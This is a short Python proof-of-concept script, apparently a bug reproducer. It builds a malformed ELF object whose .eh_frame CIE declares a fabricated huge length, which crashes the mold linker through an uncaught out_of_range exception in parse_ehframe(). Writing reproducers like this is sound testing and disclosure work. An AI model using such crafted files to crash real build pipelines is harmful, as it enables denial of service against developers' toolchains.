#!/usr/bin/env python3
"""Writes a minimal x86_64 ET_REL ELF object with one ".eh_frame" section whose sole "CIE" record
declares a huge, entirely fabricated length field. mold's parse_ehframe() (src/input-files.cc)
uses that untrusted length directly as `data.substr(size + 4)` - the single-argument
std::string_view::substr(pos) overload, which throws std::out_of_range when pos exceeds the
view's size. mold doesn't catch this, so it propagates to std::terminate() -> SIGABRT.
"""
import struct
import sys


def build() -> bytes:
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8  # ELFCLASS64, ELFDATA2LSB
    eh_frame_data = struct.pack("<II", 0x7FFFFFF0, 0)  # length=huge (lie), id=0 (CIE marker)
    shstrtab = b"\x00.eh_frame\x00.shstrtab\x00"
    name_eh_frame = 1
    name_shstrtab = 1 + len(".eh_frame") + 1

    off_ehframe = 64
    off_shstrtab = off_ehframe + len(eh_frame_data)
    off_shdrs = off_shstrtab + len(shstrtab)
    pad = (-off_shdrs) % 8
    off_shdrs += pad

    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,   # e_type = ET_REL
        62,  # e_machine = EM_X86_64
        1,   # e_version
        0,   # e_entry
        0,   # e_phoff
        off_shdrs,  # e_shoff
        0,   # e_flags
        64,  # e_ehsize
        0,   # e_phentsize
        0,   # e_phnum
        64,  # e_shentsize
        3,   # e_shnum
        2,   # e_shstrndx
    )
    assert len(ehdr) == 64

    def shdr(name, type_, flags, offset, size):
        return struct.pack("<IIQQQQIIQQ", name, type_, flags, 0, offset, size, 0, 0, 1, 0)

    sh_null = shdr(0, 0, 0, 0, 0)
    sh_ehframe = shdr(name_eh_frame, 1, 2, off_ehframe, len(eh_frame_data))  # SHT_PROGBITS, SHF_ALLOC
    sh_shstrtab = shdr(name_shstrtab, 3, 0, off_shstrtab, len(shstrtab))     # SHT_STRTAB

    return ehdr + eh_frame_data + shstrtab + b"\x00" * pad + sh_null + sh_ehframe + sh_shstrtab


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())


if __name__ == "__main__":
    main()
